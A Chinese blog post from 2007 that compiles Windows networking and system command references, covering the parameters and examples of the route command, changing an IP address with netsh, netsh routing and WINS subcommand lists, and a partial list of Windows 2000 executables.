+指定与网络目标地址相关联的网掩码（又称之为子网掩码）。子网掩码对于 IP 网络地址可以是一适当的子网掩码，对于主机路由是 255.255.255.255 ，对于默认路由是 0.0.0.0。如果忽略，则使用子网掩码 255.255.255.255。定义路由时由于目标地址和子网掩码之间的关系，目标地址不能比它对应的子网掩码更为详细。换句话说，如果子网掩码的一位是 0，则目标地址中的对应位就不能设置为 1。 
+Gateway 
+指定超过由网络目标和子网掩码定义的可达到的地址集的前一个或下一个跃点 IP 地址。对于本地连接的子网路由，网关地址是分配给连接子网接口的 IP 地址。对于要经过一个或多个路由器才可用到的远程路由，网关地址是一个分配给相邻路由器的、可直接达到的 IP 地址。 
+metric Metric 
+为路由指定所需跃点数的整数值（范围是 1 ~ 9999），它用来在路由表里的多个路由中选择与转发包中的目标地址最为匹配的路由。所选的路由具有最少的跃点数。跃点数能够反映跃点的数量、路径的速度、路径可靠性、路径吞吐量以及管理属性。 
+if Interface 
+指定目标可以到达的接口的接口索引。使用 route print 命令可以显示接口及其对应接口索引的列表。对于接口索引可以使用十进制或十六进制的值。对于十六进制值，要在十六进制数的前面加上 0x。忽略 if 参数时，接口由网关地址确定。 
+/? 
+在命令提示符显示帮助。 
+注释 
+路由表中 跃点数 一列的值较大是由于允许 TCP/IP 根据每个 LAN 接口的 IP 地址、子网掩码和默认网关的配置自动确定路由表中路由的跃点数造成的。默认启动的自动确定接口跃点数确定了每个接口的速度，调整了每个接口的路由跃点数，因此最快接口所创建的路由具有最低的跃点数。要删除大跃点数，请在每个 LAN 连接的 TCP/IP 协议的高级属性中禁用自动确定接口跃点数。 
+如果在 systemrootSystem32DriversEtc 文件夹的本地网络文件中存在适当的条目，名称可以用于 Destination。只要名称可以通过“域名系统” (DNS) 查询这样的标准主机名解析技术分解为 IP 地址，就可以将其用于 Gateway，DNS 查询使用存储在 systemrootSystem32DriversEtc 文件夹下的本地主机文件和 NetBIOS 名称解析。 
+如果是 print 或 delete 命令，可以忽略 Gateway 参数，使用通配符来表示目标和网关。Destination 的值可以是由星号 (*) 指定的通配符。如果指定目标含有一个星号 (*) 或问号 (?)，它被看作是通配符，只打印或删除匹配的目标路由。星号代表任意一字符序列，问号代表任一字符。例如， 10.*.1, 192.168.*、 127.* 和 *224* 都是星号通配符的有效使用。 
+使用了无效的目标和子网掩码（网掩码）值的组合，会显示“Route:bad gateway address netmask”错误消息。目标中有一位或多位设置为 1，而其在子网掩码中的对应位设置为 0 时会发生这个错误。可以通过二进制表示法表示目标和子网掩码来检查这种情况。以二进制表示的子网掩码包括表示目标网络地址部分的一连串的 1 和表示目标主机地址部分的一连串的 0 两个部分。查看目标以确定目标的主机地址部分（由子网掩码所定义）是否有些位设置成了 1。 
+只有 Windows NT 4.0、Windows 2000、Windows Millennium Edition 和 Windows XP 的 route 命令支持 -p 参数。Windows 95 或 Windows 98 的 route 命令不支持该参数。 
+只有当网际协议 (TCP/IP) 协议在 网络连接中安装为网络适配器属性的组件时，该命令才可用。 
+范例 
+要显示 IP 路由表的完整内容，请键入：
+route print 
+
+要显示 IP 路由表中以 10. 开始的路由，请键入： 
+
+route print 10.* 
+
+要添加默认网关地址为 192.168.12.1 的默认路由，请键入： 
+
+route add 0.0.0.0 mask 0.0.0.0 192.168.12.1 
+
+要添加目标为 10.41.0.0，子网掩码为 255.255.0.0，下一个跃点地址为 10.27.0.1 的路由，请键入： 
+
+route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 
+
+要添加目标为 10.41.0.0，子网掩码为 255.255.0.0，下一个跃点地址为 10.27.0.1 的永久路由，请键入： 
+
+route -p add 10.41.0.0 mask 255.255.0.0 10.27.0.1 
+
+要添加目标为 10.41.0.0，子网掩码为 255.255.0.0，下一个跃点地址为 10.27.0.1，跃点数为 7 的路由，请键入： 
+
+route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 metric 7 
+
+要添加目标为 10.41.0.0，子网掩码为 255.255.0.0，下一个跃点地址为 10.27.0.1，接口索引为 0x3 的路由，请键入： 
+
+route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 if 0x3 
+
+要删除目标为 10.41.0.0，子网掩码为 255.255.0.0 的路由，请键入： 
+
+route delete 10.41.0.0 mask 255.255.0.0 
+
+要删除 IP 路由表中以 10. 开始的所有路由，请键入： 
+
+route delete 10.* 
+
+要将目标为 10.41.0.0，子网掩码为 255.255.0.0 的路由的下一个跃点地址由 10.27.0.1 更改为 10.27.0.25，请键入： 
+
+route change 10.41.0.0 mask 255.255.0.0 10.27.0.25 
+
+怎样在windowsserver的cmd下更改ip地址■■■ -> Windows 2k/2003 Server 
+在命令行下更改ip地址 
+
+Windows2000是现在比较流行的操作系统，它的功能是很强大的，它甚至可以象Unix一样在命令行下做很多的工作。下面一种在命令行下更改ip地址的方法，现介绍给大家（括号里是一些注释，黑体字是人工录入的）： 
+
+C:>ipconfig (首先用ipconfig这个命令看一下更改之前的ip地址) 
+
+Windows 2000 IP Configuration 
+
+Ethernet adapter 本地连接: 
+
+Connection-specific DNS Suffix . : 
+
+IP Address. . . . . . . . . . . . : 10.1.1.94 （本地连接更改之前的ip） 
+
+Subnet Mask . . . . . . . . . . . : 255.255.255.0 
+
+Default Gateway . . . . . . . . . : 10.1.1.254
+
+C:>netsh （进入设置模式） 
+
+netsh>interface 
+
+interface>ip 
+
+interface ip>set address "本地连接" static 10.1.1.111 255.255.255.0 10.1.1.254 
+
+interface ip>exit 
+
+上文中的set命令具体解释如下: 
+
+set address - 设置指定的接口的 IP 地址和默认网关。 
+
+set dns - 设置 DNS 服务器模式和地址。 
+
+set wins - 设置 WINS 服务器模式和地址。 
+
+C:>ipconfig （更改后再用ipconfig命令看一下,确认一下是否更改成功） 
+
+Windows 2000 IP Configuration 
+
+Ethernet adapter 本地连接: 
+
+Connection-specific DNS Suffix . : 
+
+IP Address. . . . . . . . . . . . : 10.1.1.111 
+
+Subnet Mask . . . . . . . . . . . : 255.255.255.0 
+
+Default Gateway . . . . . . . . . : 10.1.1.254 
+命令一览 
+.. - 移到上一层上下文级。 
+? - 显示命令列表。 
+aaaa - 更改到 `aaaa/ 上下文。 
+abort - 丢弃在脱机模式下所做的更改。 
+add - 将一个配置项添加到项目列表中。 
+alias - 添加一个别名 
+bye - 退出程序。 
+commit - 提交在脱机模式中所做的更改。 
+delete - 在项目列表上删除一个配置项目。 
+dhcp - 更改到 `dhcp/ 上下文。 
+dump - 显示一个配置脚本。 
+exec - 运行一个脚本文件。 
+exit - 退出程序。 
+help - 显示命令列表。 
+interface - 更改到 `interface/ 上下文。 
+offline - 将当前模式设置成脱机。 
+online - 将当前模式设置成联机。 
+popd - 从堆栈上打开一个上下文。 
+pushd - 将当前上下文放推入堆栈。 
+quit - 退出程序。 
+ras - 更改到 `ras/ 上下文。 
+routing - 更改到 `routing/ 上下文。 
+set - 更新配置设置。 
+show - 显示信息 
+unalias - 删除一个别名。 
+wins - 更改到 `wins/ 上下文。
+
+route 的命令 
+routing ip add/delete/set/show interface 在指定接口上添加、删除、配置或显示常规 IP 路由设置。 
+routing ip add/delete/set/show filter 在指定接口上添加、删除、配置或显示 IP 数据包筛选器。 
+routing ip add/delete/show boundary 在指定接口上添加、删除或显示多播边界设置。 
+routing ip add/set ipiptunnel 添加或配置 IP 中的 IP 接口。 
+routing ip add/delete/set/show rtmroute 添加、配置或显示不持续的路由表管理器路由。 
+routing ip add/delete/set/show persistentroute 添加、删除、配置或显示持续路由。 
+routing ip add/delete/set/show preferenceforprotocol 添加、删除、配置或显示路由协议的优先级。 
+routing ip add/delete/set/show scope 添加、删除或显示多播作用域。 
+routing ip set/show loglevel 配置或显示全局 IP 记录等级。 
+routing ip show helper 显示 IP 的所有 Netsh 实用程序子环境。 
+routing ip show protocol 显示所有正在运行的 IP 路由协议。 
+routing ip show mfe 显示多播转发项。 
+routing ip show mfestats 显示多播转发项统计。 
+routing ip show boundarystats 显示 IP 多播边界。 
+routing ip show rtmdestinations 显示路由表管理器路由表中的目标。 
+routing ip show rtmroutes 显示路由表管理器路由表中的路由。 
+routing ip nat set/show global 配置或显示全局网络地址转换 (NAT) 设置。 
+routing ip nat add/delete/set/show interface 添加、删除、配置或显示指定接口的 NAT 设置。 
+routing ip nat add/delete addressrange 在 NAT 接口公用地址池中添加或删除一个地址范围。 
+routing ip nat add/delete addressmapping 添加或删除 NAT 地址映射。 
+routing ip nat add/delete portmapping 添加或删除 NAT 端口映射。 
+routing ip autodhcp set/show global 配置或显示全局 DHCP 分配器参数。 
+routing ip autodhcp set/show interface 配置或显示指定接口的 DHCP 分配器设置。 
+routing ip autodhcp add/delete exclusion 在 DHCP 分配器地址范围中添加或删除一个排除范围。 
+routing ip dnsproxy set/show global 配置或显示全局 DNS 代理参数。 
+routing ip dnsproxy set/show interface 配置或显示指定接口的 DNS 代理参数。 
+routing ip igmp set/show global 配置或显示 IGMP 全局设置。 
+routing ip igmp add/delete/set/show interface 在指定接口上添加、删除、配置或显示 IGMP。 
+routing ip igmp add/delete staticgroup 添加或删除指定接口的静态多播组。 
+routing ip igmp show grouptable 显示 IGMP 主机组表。 
+routing ip igmp show ifstats 显示每个接口的 IGMP 统计。 
+routing ip igmp show iftable 显示每个接口的 IGMP 主机组。 
+routing ip igmp show proxygrouptable 显示 IGMP 代理接口的 IGMP 组表。 
+routing ip igmp show rasgrouptable 显示远程访问服务器所使用的 Internet 接口的组表。 
+routing ip ospf set/show global 配置或显示全局 OSPF 设置。 
+routing ip ospf add/delete/set/show interface 在指定接口上添加、删除、配置或显示 OSPF。 
+routing ip ospf add/delete/set/show area 添加、删除、配置或显示 OSPF 区域。 
+routing ip ospf add/delete/show range 在指定的 OSPF 区域上添加、删除、配置或显示范围。 
+routing ip ospf add/delete/set/show virtif 添加、删除、配置或显示 OSPF 虚拟接口。 
+routing ip ospf add/delete/show neighbor 添加、删除、配置或显示 OSPF 邻居。 
+routing ip ospf add/delete/show protofilter 添加、删除、配置或显示 OSPF 外部路由的路由信息源。 
+routing ip ospf add/delete/show routefilter 添加、删除、配置或显示 OSPF 外部路由的路由筛选。 
+routing ip ospf show areastats 显示 OSPF 区域统计。 
+routing ip ospf show lsdb 显示 OSPF 链接状态数据库。 
+routing ip ospf show virtifstats 显示 OSPF 虚拟链接统计。 
+routing ip relay set global 配置“DHCP 中继代理程序”的全局设置。 
+routing ip relay add/delete/set interface 在指定接口上添加、删除或配置“DHCP 中继代理程序”设置。 
+routing ip relay add/delete dhcpserver 在 DHCP 服务器地址列表中添加或删除 DHCP 服务器的 IP 地址。 
+routing ip relay show ifbinding 显示接口的 IP 地址绑定。 
+routing ip relay show ifconfig 显示每个接口的“DHCP 中继代理程序”配置。 
+routing ip relay show ifstats 显示每个接口的 DHCP 统计。 
+routing ip rip set/show global 配置 IP 的 RIP 全局设置。 
+routing ip rip add/delete/set/show interface 在指定接口上添加或配置 IP 的 RIP 设置。 
+routing ip rip add/delete peerfilter 添加或删除 RIP 对等筛选器。 
+routing ip rip add/delete acceptfilter 在接受的路由列表中添加或删除 RIP 路由筛选器。 
+routing ip rip add/delete announcefilter 在公布的路由列表中添加或删除 RIP 路由筛选器。 
+routing ip rip add/delete/show neighbor 添加或删除 RIP 邻居。 
+routing ip rip set/show flags 在指定接口上配置 IP RIP 高级设置。 
+routing ip rip show globalstats 显示全局 RIP 参数。 
+routing ip rip show ifbinding 显示接口的 IP 地址绑定。 
+routing ip rip show ifstats 显示每个接口的 RIP 统计。 
+IPX netsh 路由命令 
+routing ipx add/set staticroute 在 IPX 路由表中添加或配置静态 IPX 路由。 
+routing ipx add/set staticservice 在 SAP 服务表中添加或配置静态 SAP 服务。 
+routing ipx add/set filter 在指定的接口上添加或配置 IPX 数据包筛选器。 
+routing ipx add/set interface 在请求拨号接口上启用 IPX 路由，或在指定的接口上配置 IPX 设置。 
+routing ipx set global 配置全局 IPX 路由设置。 
+routing ipx rip add/set filter 添加和配置 RIP 路由筛选器。 
+routing ipx rip set global 配置全局 IPX 的 RIP 设置。 
+routing ipx rip set interface 在指定接口上配置 IPX 的 RIP 设置。 
+routing ipx sap add/set filter 添加或配置 SAP 服务筛选器。 
+routing ipx sap set global 配置全局 IPX 的 SAP 设置。 
+routing ipx sap set interface 在指定接口上配置 IPX 的 SAP 设置。 
+routing ipx netbios add nbname 将静态 NETBIOS 名称添加到 IPX NetBIOS 名称表中。 
+routing ipx netbios set interface 在指定接口上配置基于 IPX 的 NetBIOS 设置。
+
+WINS NetSh 命令 
+list 列出所有可用的 WINS 命令。 
+dump 将 WINS 服务器配置转储到命令输出。 
+add name 在服务器上注册名称。详细信息，请输入 add name /? 
+add partner 向服务器添加复制伙伴。详细信息，请输入 add partner /? 
+add pngserver 添加当前服务器的 Persona Non Grata 服务器列表。详细信息，请输入 add pngserver /? 
+check database 检查数据库的一致性。详细信息，请输入 check database /? 
+check name 检查一组 WINS 服务器的名称记录列表。详细信息，请输入 check name /? 
+check version 检查版本号的一致性。详细信息，请输入 check version /? 
+delete name 从服务器数据库中删除已注册的名称。详细信息，请输入 delete name /? 
+delete partner 从复制伙伴列表中删除复制伙伴。详细信息，请输入 delete partner /? 
+delete records 从服务器删除或逻辑删除所有记录或一组记录。详细信息，请输入 delete records /? 
+delete owners 删除所有者列表及其记录。详细信息，请输入 delete owners /? 
+delete pngserver 从列表中删除所有的或选定的 Persona Non Grata 服务器。详细信息，请输入 delete pngserver /? 
+init backup 备份 WINS 数据库。详细信息，请输入 init backup /? 
+init import 从 Lmhosts 文件导入数据。详细信息，请输入 init import /? 
+init pull 启动“拉”触发器，并发送给另一台 WINS 服务器。详细信息，请输入 init pull /? 
+init pullrange 开始另一台 WINS 服务器的一组记录，并读取该记录。详细信息，请输入 init pullrange /? 
+init push 启动“推”触发器，并发送给另一台 WINS 服务器。详细信息，请输入 init push /? 
+init replicate 用复制伙伴复制数据库。详细信息，请输入 init replicate /? 
+init restore 从文件还原数据库。详细信息，请输入 init restore /? 
+init scavenge 清除服务器的 WINS 数据库。详细信息，请输入 init scavenge /? 
+init search 搜索服务器的 WINS 数据库。详细信息，请输入 init search /? 
+reset statistics 重置服务器的统计信息。详细信息，请输入 reset statistics /? 
+set autopartnerconfig 设置服务器的自动复制伙伴配置信息。详细信息，请输入 set autopartnerconfig /? 
+set backuppath 设置服务器的备份参数。详细信息，请输入 set backuppath /? 
+set burstparam 设置服务器的突发处理参数。详细信息，请输入 set autopartnerconfig /? 
+set logparam 设置数据库和事件日志记录选项。详细信息，请输入 set logparam /? 
+set migrateflag 设置服务器的迁移标志。详细信息，请输入 set migrateflag /? 
+set namerecord 设置服务器的间隔和超时值。详细信息，请输入 set namerecord /? 
+set periodicdbchecking 设置服务器的定期数据库检查参数。详细信息，请输入 set periodicdbchecking /? 
+set pullpartnerconfig 设置指定的“拉”伙伴的配置参数。详细信息，请输入 set pullpartnerconfig /? 
+set pushpartnerconfig 设置指定的“推”伙伴的配置参数。详细信息，请输入 set pushpartnerconfig /? 
+set pullparam 设置服务器的默认“拉”参数。详细信息，请输入 set pullparam /? 
+set pushparam 设置服务器的默认“推”参数。详细信息，请输入 set pushparam /? 
+set replicateflag 设置服务器的复制标志。详细信息，请输入 set replicateflag /? 
+set startversion 设置数据库的开始版本 ID。详细信息，请输入 set startversion /? 
+show browser 显示所有活动域主浏览器的 [1Bh] 记录。详细信息，请输入 show browser /? 
+show database 显示指定服务器的数据库和记录。详细信息，请输入 show database /? 
+show info 显示配置信息。详细信息，请输入 show info /? 
+show name 显示服务器中特定记录的详细信息。详细信息，请输入 show name /? 
+show partner 显示服务器的“拉”或“推”（或“推拉”）伙伴。详细信息，请输入 show partner /? 
+show partnerproperties 显示默认伙伴配置。详细信息，请输入 show partnerproperties /? 
+show pullpartnerconfig 显示“拉”伙伴的配置信息。详细信息，请输入 show pullpartnerconfig /? 
+show pushpartnerconfig 显示“推”伙伴的配置信息。详细信息，请输入 show pushpartnerconfig /? 
+show reccount 显示指定服务器所拥有的记录数量。详细信息，请输入 show reccount /? 
+show recbyversion 显示指定服务器所拥有的记录。详细信息，请输入 show recbyversion /? 
+show server 显示当前选定的服务器。详细信息，请输入 show server /? 
+show statistics 显示 WINS 服务器的统计信息。详细信息，请输入 show statistics /? 
+show version 显示 WINS 服务器的当前版本计数器值。详细信息，请输入 show version /? 
+show versionmap 显示所有者 ID 到“最大版本数”的映射。详细信息，请输入 show versionmap /? 
+Interface 命令 
+interface set/show interface 启用、禁用、连接、断开连接以及显示请求拨号接口的配置。 
+interface set/show credentials 在请求拨号接口上配置或显示用户名、密码和域名。
+
+Win2000命令全集 
+
+accwiz.exe > Accessibility Wizard for walking you through setting up your machine for your mobility needs. 辅助工具向导 
+
+acsetups.exe > ACS setup DCOM server executable 
+
+actmovie.exe > Direct Show setup tool 直接显示安装工具 
+
+append.exe > Allows programs to open data in specified directories as if they were in the current directory. 允许程序打开制定目录中的数据 
+
+arp.exe > NETWORK Display and modify IP - Hardware addresses 显示和更改计算机的IP与硬件物理地址的对应列表 
+
+at.exe > AT is a scheduling utility also included with UNIX 计划运行任务 
+
+atmadm.exe > Displays statistics for ATM call manager. ATM调用管理器统计 
+
+attrib.exe > Display and modify attributes for files and folders 显示和更改文件和文件夹属性 
+
+autochk.exe > Used to check and repair Windows File Systems 检测修复文件系统 
+
+autoconv.exe > Automates the file system conversion during reboots 在启动过程中自动转化系统 
+
+autofmt.exe > Automates the file format process during reboots 在启动过程中格式化进程 
+
+autolfn.exe > Used for formatting long file names 使用长文件名格式 
+
+bootok.exe > Boot acceptance application for registry 
+
+bootvrfy.exe > Bootvrfy.exe, a program included in Windows 2000 that notifies the system that startup was successful. Bootvrfy.exe can be run on a local or remote computer. 通报启动成功 
+cacls.exe > Displays or modifies access control lists (ACLs) of files. 显示和编辑ACL 
+
+calc.exe > Windows Calculators 计算器 
+
+cdplayer.exe > Windows CD Player CD播放器 
+
+change.exe > Change { User | Port | Logon } 与终端服务器相关的查询 
+
+charmap.exe > Character Map 字符映射表 
+
+chglogon.exe > Same as using "Change Logon" 启动或停用会话记录 
+
+chgport.exe > Same as using "Change Port" 改变端口（终端服务） 
+
+chgusr.exe > Same as using "Change User" 改变用户（终端服务） 
+
+chkdsk.exe > Check the hard disk for errors similar to Scandisk 3 Stages must specify a Drive Letter 磁盘检测程序 
+
+chkntfs.exe > Same as using chkdsk but for NTFS NTFS磁盘检测程序 
+
+cidaemon.exe > Component of Ci Filer Service 组成Ci文档服务 
+
+cipher.exe > Displays or alters the encryption of directories [files] on NTFS partitions. 在NTFS上显示或改变加密的文件或目录 
+
+cisvc.exe > Content Index -- It/s the content indexing service for I 索引内容 
+
+ckcnv.exe > Cookie Convertor 变换Cookie 
+
+cleanmgr.exe > Disk Cleanup, popular with Windows 98 磁盘清理 
+
+cliconfg.exe > SQL Server Client Network Utility SQL客户网络工具 
+
+clipbrd.exe > Clipboard viewer for Local will allow you to connect to other clipboards 剪贴簿查看器 
+
+clipsrv.exe > Start the clipboard Server 运行Clipboard服务 
+
+clspack.exe > CLSPACK used to create a file listing of system packages 建立系统文件列表清单 
+
+cluster.exe > Display a cluster in a domain 显示域的集群 
+
+_cmd_.exe > Famous command prompt 没什么好说的！ 
+
+cmdl32.exe > Connection Manager Auto-Download 自动下载连接管理 
+
+cmmgr32.exe > Connection Manager 连接管理器 
+
+cmmon32.exe > Connection Manager Monitor 连接管理器监视 
+
+cmstp.exe > Connection Manager Profile Manager 连接管理器配置文件安装程序 
+
+comclust.exe > about cluster server 集群 
+
+comp.exe > ComClust Add, Remove, or Join a cluster. 比较两个文件和文件集的内容＊ 
+
+compact.exe > Displays or alters the compression of files on NTFS partitions. 显示或改变NTFS分区上文件的压缩状态 
+
+conime.exe > Console IME IME控制台 
+
+control.exe > Starts the control panel 控制面板 
+
+convert.exe > Convert File System to NTFS 转换文件系统到NTFS 
+
+convlog.exe > Converts MS IIS log files 转换IIS日志文件格式到NCSA格式 
+
+cprofile.exe > Copy profiles 转换显示模式 
+
+cscript.exe > MS Windows Scripts Host Version 5.1 较本宿主版本 
+
+csrss.exe > Client Server Runtime Process 客户服务器Runtime进程 
+
+csvde.exe > Comma Separated Variable Import/Export Utility 日至格式转换程序 
+
+dbgtrace.exe > 和Terminal Server相关 
+
+dcomcnfg.exe > Display the current DCOM configuration. DCOM配置属性 
+
+dcphelp.exe > ? 
+
+dcpromo.exe > Promote a domain controller to ADSI AD安装向导 
+
+ddeshare.exe > Display DDE shares on local or remote computer DDE共享 
+
+ddmprxy.exe > 
+
+debug.exe > Runs Debug, a program testing and editing tool. 就是DEBUG啦！ 
+
+dfrgfat.exe > Defrag FAT file system FAT分区磁盘碎片整理程序 
+
+dfrgntfs.exe > Defrag NTFS file system NTFS分区磁盘碎片整理程序 
+
+dfs_cmd_.exe > configures a Dfs tree 配置一个DFS树 
+
+dfsinit.exe > Distributed File System Initialization 分布式文件系统初始化 
+
+dfssvc.exe > Distributed File System Server
+
+ 
+
+
+      
+
+
+ 
+
+置顶删除编辑草稿分类：默认分类　2007-09-10 12:10          公司简介- 联系方法- 招聘信息- 客户服务- 相关法律- 用户反馈- 举报不良信息-   
+网易公司版权所有 ?1997-2008
+ 
+正在加载中...
